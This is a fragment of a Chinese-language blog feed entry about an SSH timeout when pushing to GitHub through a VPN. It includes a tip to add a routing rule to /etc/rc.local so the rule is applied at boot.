&lt;p&gt;为了开机自动添加此路由规则，打开 &lt;strong&gt;/etc/rc.local&lt;/strong&gt; ，将此命令添加至此文件。&lt;/p&gt;</content><author><name></name></author><category term="[&quot;Network&quot;]" /><summary type="html">使用VPN上网时，如果使用git向远程仓库push代码，可能会出现下面的错误： $ git push ssh: connect to host github.com port 22: Connection timed out fatal: Could not read from remote repository.</summary></entry></feed>